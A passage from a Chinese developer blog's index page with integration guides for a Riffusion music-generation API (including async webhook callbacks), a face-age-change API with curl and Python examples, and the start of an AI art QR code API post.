class="string">"high"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"state"</span>: <span class="string">"succeeded"</span>,</span><br><span class="line">            <span class="attr">"style"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"duration"</span>: <span class="number">195.55968253968254</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"dfd6eb9c-a1f3-4e1f-bbf9-e0b9625e459f"</span>,</span><br><span class="line">            <span class="attr">"title"</span>: <span class="string">"Vivid Rise"</span>,</span><br><span class="line">            <span class="attr">"image_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/25ce4ddd-e48c-42e2-9ea3-8e03380508f2/image/dfd6eb9c-a1f3-4e1f-bbf9-e0b9625e459f.jpg"</span>,</span><br><span class="line">            <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high"</span>,</span><br><span class="line">            <span class="attr">"audio_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/25ce4ddd-e48c-42e2-9ea3-8e03380508f2/audio/dfd6eb9c-a1f3-4e1f-bbf9-e0b9625e459f.m4a"</span>,</span><br><span class="line">            <span class="attr">"video_url"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"created_at"</span>: <span class="string">"2025-06-23T02:04:27.140387Z"</span>,</span><br><span class="line">            <span class="attr">"model"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"lyrics_timestamped"</span>: &#123;</span><br><span class="line">                <span class="attr">"words"</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">1.28</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">1.28</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"[Verse]"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    ...</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">188.8</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">29</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">188.16</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"high"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"state"</span>: <span class="string">"succeeded"</span>,</span><br><span class="line">            <span class="attr">"style"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="attr">"duration"</span>: <span class="number">196.07185941043085</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="异步回调"><a href="#异步回调" class="headerlink" title="异步回调"></a>异步回调</h2>
                  <p>由于 Riffusion Audios Generation API 生成的时间有时候会相对较长，如果 API 长时间无响应，HTTP 请求会一直保持连接，导致额外的系统资源消耗，所以本 API 也提供了异步回调的支持。</p>
                  <p>整体流程是：客户端发起请求的时候，额外指定一个 <code>callback_url</code> 字段，客户端发起 API 请求之后，API 会立马返回一个结果，包含一个 <code>task_id</code> 的字段信息，代表当前的任务 ID。当任务完成之后，生成任务的结果会通过 POST JSON 的形式发送到客户端指定的 <code>callback_url</code>，其中也包括了 <code>task_id</code> 字段，这样任务结果就可以通过 ID 关联起来了。</p>
                  <p>下面我们通过示例来了解下具体怎样操作。</p>
                  <p>首先，Webhook 回调是一个可以接收 HTTP 请求的服务，开发者应该替换为自己搭建的 HTTP 服务器的 URL。此处为了方便演示，使用一个公开的 Webhook 样例网站 <a href="https://webhook.site/" target="_blank" rel="noopener">https://webhook.site/</a>，打开该网站即可得到一个 Webhook URL，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/tbcnai.png" alt=""></p>
                  <p>将此 URL 复制下来，就可以作为 Webhook 来使用，此处的样例为 <a href="https://webhook.site/68368fc6-7f0a-425e-b63a-cc48631615fe" target="_blank" rel="noopener">https://webhook.site/68368fc6-7f0a-425e-b63a-cc48631615fe</a>。</p>
                  <p>接下来，我们可以设置字段 <code>callback_url</code> 为上述 Webhook URL，同时填入相应的参数，具体的内容如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/kk7y6q.png" width="500" class="m-auto"></p>
                  <p>点击运行，可以发现会立即得到一个结果，如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"9939767a-7f9c-4f43-aabf-ca68fe385f3c"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>稍等片刻，我们可以在 <a href="https://webhook.site/68368fc6-7f0a-425e-b63a-cc48631615fe" target="_blank" rel="noopener">https://webhook.site/68368fc6-7f0a-425e-b63a-cc48631615fe</a> 上观察到生成任务的结果，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/bgujzg.png" alt=""></p>
                  <p>内容如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"9939767a-7f9c-4f43-aabf-ca68fe385f3c"</span>,</span><br><span class="line">  <span class="attr">"trace_id"</span>: <span class="string">"13a86870-e705-45d0-8447-82a08701c0fa"</span>,</span><br><span class="line">  <span class="attr">"data"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="string">"72e6c476-0116-4da9-ae34-f78190020b35"</span>,</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">"Rise"</span>,</span><br><span class="line">      <span class="attr">"image_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/9b9f3281-6b47-44ac-8e4b-3b0d105e163d/image/72e6c476-0116-4da9-ae34-f78190020b35.jpg"</span>,</span><br><span class="line">      <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high"</span>,</span><br><span class="line">      <span class="attr">"audio_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/9b9f3281-6b47-44ac-8e4b-3b0d105e163d/audio/72e6c476-0116-4da9-ae34-f78190020b35.m4a"</span>,</span><br><span class="line">      <span class="attr">"video_url"</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">"created_at"</span>: <span class="string">"2025-06-15T15:43:22.432605Z"</span>,</span><br><span class="line">      <span class="attr">"model"</span>: <span class="string">"FUZZ-1.0"</span>,</span><br><span class="line">      <span class="attr">"state"</span>: <span class="string">"succeeded"</span>,</span><br><span class="line">      <span class="attr">"style"</span>: <span class="string">"acoustic folk, finger picking"</span>,</span><br><span class="line">      <span class="attr">"duration"</span>: <span class="number">184.96</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="string">"7f4f5c20-4395-4583-9dbb-735b9bb86957"</span>,</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">"Luminance"</span>,</span><br><span class="line">      <span class="attr">"image_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/9b9f3281-6b47-44ac-8e4b-3b0d105e163d/image/7f4f5c20-4395-4583-9dbb-735b9bb86957.jpg"</span>,</span><br><span class="line">      <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high"</span>,</span><br><span class="line">      <span class="attr">"audio_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/9b9f3281-6b47-44ac-8e4b-3b0d105e163d/audio/7f4f5c20-4395-4583-9dbb-735b9bb86957.m4a"</span>,</span><br><span class="line">      <span class="attr">"video_url"</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">"created_at"</span>: <span class="string">"2025-06-15T15:43:21.574561Z"</span>,</span><br><span class="line">      <span class="attr">"model"</span>: <span class="string">"FUZZ-1.0"</span>,</span><br><span class="line">      <span class="attr">"state"</span>: <span class="string">"succeeded"</span>,</span><br><span class="line">      <span class="attr">"style"</span>: <span class="string">"deep bass, ethereal electronic"</span>,</span><br><span class="line">      <span class="attr">"duration"</span>: <span class="number">165.12</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到结果中有一个 <code>task_id</code> 字段，其他的字段都和上文类似，通过该字段即可实现任务的关联。</p>
                  <h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2>
                  <p>在调用 API 时，如果遇到错误，API 会返回相应的错误代码和信息。例如：</p>
                  <ul>
                    <li><code>400 token_mismatched</code>：Bad request, possibly due to missing or invalid parameters.</li>
                    <li><code>400 api_not_implemented</code>：Bad request, possibly due to missing or invalid parameters.</li>
                    <li><code>401 invalid_token</code>：Unauthorized, invalid or missing authorization token.</li>
                    <li><code>429 too_many_requests</code>：Too many requests, you have exceeded the rate limit.</li>
                    <li><code>500 api_error</code>：Internal server error, something went wrong on the server.</li>
                  </ul>
                  <h3 id="错误响应示例"><a href="#错误响应示例" class="headerlink" title="错误响应示例"></a>错误响应示例</h3>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"error"</span>: &#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"api_error"</span>,</span><br><span class="line">    <span class="attr">"message"</span>: <span class="string">"fetch failed"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"trace_id"</span>: <span class="string">"2cf86e86-22a4-46e1-ac2f-032c0f2a4e89"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2>
                  <p>通过本文档，您已经了解了如何使用 Riffusion Audios Generation API 可通过输入提示词来生成音乐。希望本文档能帮助您更好地对接和使用该 API。如有任何问题，请随时联系我们的技术支持团队。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2025-06-24 20:01:22" itemprop="dateCreated datePublished" datetime="2025-06-24T20:01:22+08:00">2025-06-24</time>
                </span>
                <span id="/42372.html" class="post-meta-item leancloud_visitors" data-flag-title="Riffusion Audios Generation API 对接说明" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>38k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>35 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42371.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> API <i class="label-arrow"></i>
                  </a>
                  <a href="/42371.html" class="post-title-link" itemprop="url">人脸年龄变化 API 对接说明</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>本文将介绍一种 人脸年龄变化 API 对接说明，它可以通过输入图片和年龄，从而来改变图片中人脸的年龄图片，大致的用法是用户上传一张人脸图片，基于人脸编辑与生成算法，输出一张人脸变老或变年轻的图片，支持实现人脸不同年龄的变化。</p>
                  <p>接下来介绍下 人脸年龄变化 API 的对接说明。</p>
                  <h2 id="申请流程"><a href="#申请流程" class="headerlink" title="申请流程"></a>申请流程</h2>
                  <p>要使用 API，需要先到 <a href="https://platform.acedata.cloud/documents/0c5b4165-25ba-4dc2-8f02-e3cd74ab4238" target="_blank" rel="noopener">人脸年龄变化 API</a> 对应页面申请对应的服务，进入页面之后，点击「Acquire」按钮，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/q6ytrc.png" alt=""></p>
                  <p>如果你尚未登录或注册，会自动跳转到登录页面邀请您来注册和登录，登录注册之后会自动返回当前页面。</p>
                  <p>在首次申请时会有免费额度赠送，可以免费使用该 API。</p>
                  <h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2>
                  <p>首先先了解下基本的使用方式，就是输入图片链接以及年龄信息，便可获得处理后结果图片，首先需要简单地传递一个 <code>image_url</code> 字段，人脸图片如下图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/f5687u.png" width="500" class="m-auto"></p>
                  <p>然后我们还需上传关于人脸年龄信息参数 <code>age_infos</code> ，它是一个数组，我们可以传多个信息，我们接下来就可以在界面上填写对应的内容，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/cn95e8.png" width="500" class="m-auto"></p>
                  <p>可以看到这里我们设置了 Request Headers，包括：</p>
                  <ul>
                    <li><code>accept</code>：想要接收怎样格式的响应结果，这里填写为 <code>application/json</code>，即 JSON 格式。</li>
                    <li><code>authorization</code>：调用 API 的密钥，申请之后可以直接下拉选择。</li>
                  </ul>
                  <p>另外设置了 Request Body，包括：</p>
                  <ul>
                    <li><code>image_url</code>：需要处理的人脸图片链接。</li>
                    <li><code>age_infos</code>：关于人脸年龄和区域信息，其中年龄是必选参数。</li>
                  </ul>
                  <p>选择之后，可以发现右侧也生成了对应代码，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/zk8qkl.png" width="500" class="m-auto"></p>
                  <p>点击「Try」按钮即可进行测试，如上图所示，这里我们就得到了如下结果：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"image_url"</span>: <span class="string">"https://faceeffect-1254418846.cos.ap-guangzhou.myqcloud.com/ft/ChangeAgePic/1256437459/bfce1ab8-5fd7-464d-8878-b38433f84d0e"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，这里返回的结果中有一个 <code>image_url</code> 字段，就是根据输入年龄变化后的人脸图片。其中变化后人脸信息如下所示：</p>
                  <p><img src="https://cdn.acedata.cloud/01rmiv.png" width="500" class="m-auto"></p>
                  <p>可以看到图片中人脸是根据输入的年龄发生了变化。</p>
                  <p>另外如果想生成对应的对接代码，可以直接复制生成，例如 CURL 的代码如下：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/face/change-age' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "age_infos": [&#123;"age":60&#125;],</span><br><span class="line">  "image_url": "https://cdn.acedata.cloud/f5687u.png"</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>Python 的对接代码如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://api.acedata.cloud/face/change-age"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"accept"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">    <span class="string">"authorization"</span>: <span class="string">"Bearer &#123;token&#125;"</span>,</span><br><span class="line">    <span class="string">"content-type"</span>: <span class="string">"application/json"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">"age_infos"</span>: [&#123;<span class="string">"age"</span>:<span class="number">60</span>&#125;],</span><br><span class="line">    <span class="string">"image_url"</span>: <span class="string">"https://cdn.acedata.cloud/f5687u.png"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=payload, headers=headers)</span><br><span class="line">print(response.text)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2>
                  <p>在调用 API 时，如果遇到错误，API 会返回相应的错误代码和信息。例如：</p>
                  <ul>
                    <li><code>400 token_mismatched</code>：Bad request, possibly due to missing or invalid parameters.</li>
                    <li><code>400 api_not_implemented</code>：Bad request, possibly due to missing or invalid parameters.</li>
                    <li><code>401 invalid_token</code>：Unauthorized, invalid or missing authorization token.</li>
                    <li><code>429 too_many_requests</code>：Too many requests, you have exceeded the rate limit.</li>
                    <li><code>500 api_error</code>：Internal server error, something went wrong on the server.</li>
                  </ul>
                  <h3 id="错误响应示例"><a href="#错误响应示例" class="headerlink" title="错误响应示例"></a>错误响应示例</h3>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"error"</span>: &#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"api_error"</span>,</span><br><span class="line">    <span class="attr">"message"</span>: <span class="string">"fetch failed"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"trace_id"</span>: <span class="string">"2cf86e86-22a4-46e1-ac2f-032c0f2a4e89"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2>
                  <p>通过本文档，您已经了解了如何使用 人脸年龄变化 API 对输入的图片和年龄信息来进行人脸年龄变化。希望本文档能帮助您更好地对接和使用该 API。如有任何问题，请随时联系我们的技术支持团队。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2024-12-15 20:01:22" itemprop="dateCreated datePublished" datetime="2024-12-15T20:01:22+08:00">2024-12-15</time>
                </span>
                <span id="/42371.html" class="post-meta-item leancloud_visitors" data-flag-title="人脸年龄变化 API 对接说明" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>2.2k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>2 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42370.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 艺术二维码 <i class="label-arrow"></i>
                  </a>
                  <a href="/42370.html" class="post-title-link" itemprop="url">二维码耍出新花样，充满创意艺术</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>艺术二维码是一种创新的技术产品，它将二维码与美观的背景图像相结合，创造出既实用又美观的作品。它们不仅具有传统二维码的功能性，能被智能设备快速扫描识别，还加入了艺术元素，增强了视觉吸引力和品牌识别度。其中，部分艺术二维码甚至由人工智能生成，充分利用了现代技术，展示出无与伦比的创新和独特性。这使得艺术二维码在品牌营销、广告推广等领域有着广泛的应用。</p>
                  <p>简单来说，艺术二维码是扫描二维码与艺术美感的完美结合，它不仅提供了信息传递的功能，同时也能提升用户的视觉体验，使得每一次的扫描都充满艺术的享受。</p>
                  <h2 id="作品概览"><a href="#作品概览" class="headerlink" title="作品概览"></a>作品概览</h2>
                  <p>我们先来看几个二维码作品：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-28-172022.png" alt=""></p>
                  <p>怎么样？这些二维码就是艺术二维码，它实现了图片和二维码的完美结合，比普通的二维码更加具有艺术感。而且关键是，每一个二维码都能扫描！</p>
                  <h2 id="怎样制作？"><a href="#怎样制作？" class="headerlink" title="怎样制作？"></a>怎样制作？</h2>
                  <p>想制作这样的二维码吗？怎么来制作这样的艺术二维码呢？</p>
                  <p>其实这个从技术来讲是相对复杂的。在现在这个 AI 时代，目前艺术二维码的解决方案是基于 Stable Diffusion 来做的，通过输入 prompt 我们可以生成对应的图片，同时结合一些二维码内容的融合最终实现这样的效果。</p>
                  <p>所以这里面其实最主要的挑战在于：如何既把二维码做得好看而且富有艺术，而且二维码还能被正确扫描。说实话这个技术其实还是蛮难的，需要大量的参数调整才能做到稍微好点的效果。</p>
                  <p>应该 99% 的人在第一步就放弃了。</p>
                  <p>假设通过不断的调整，我们真的做出来了这样的效果，真正运行起来也是一个不小的开销，如果要速度比较快的话，可能得性能比较好的 GPU，可能一不小心就上万块钱了。</p>
                  <p>有朋友可能会说：我不想费那么多精力，我也不想花那么多钱，我就想做个艺术二维码，或者我想把这个能力集成到我的产品里面，要是有这样现成的 API 就好了。</p>
                  <p>有吗？还真有。</p>
                  <p>本平台提供了艺术二维码相关生成 API，我们可以调用 API 输入各种参数，比如图片内容、二维码链接、样式风格等等各种参数，就可以非常方便地生成想要的艺术二维码了，而且首次申请免费赠送 20 张绘制次数。</p>
                  <h2 id="申请-API"><a href="#申请-API" class="headerlink" title="申请 API"></a>申请 API</h2>
                  <p>要使用艺术二维码 API，首先可以到<a href="https://data.zhishuyun.com/documents/ee085d2a-a0b9-4f0e-8b4d-8da407345138" target="_blank" rel="noopener" title="艺术二维码 API ">艺术二维码 API </a>页面点击「获取」按钮：</p>
                  <p><img src="https://cdn.zhishuyun.com/2023-08-28-172029.png" alt=""></p>
                  <p>如果你尚未登录，会自动跳转到登录页面，扫码关注公众号即可自动登录，无需额外注册步骤。</p>
                  <p>登录完了之后会跳回原页面，此时会提示「您尚未申请该服务，需要申请」。申请时会校验实名认证情况，请按照网站提示完成实名认证。实名认证会校验姓名、手机号、身份证号，认证完了之后可以返回页面，刷新一下页面确保信息更新，然后重新申请即可通过申请。</p>
                  <h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2>
                  <p>要使用艺术二维码的最基本的功能，需要填入如下几个必须参数：</p>
                  <ul>
                    <li>type：二维码的类型，如纯文本、链接等。</li>
                    <li>content：二维码的内容，比如如果是链接的话，我们可以填入对应的链接。</li>
                    <li>prompt：二维码对应的风格绘制指令，强烈建议用英文。比如说 <code>pizza</code> 则会绘制一个像披萨的二维码。</li>
                  </ul>
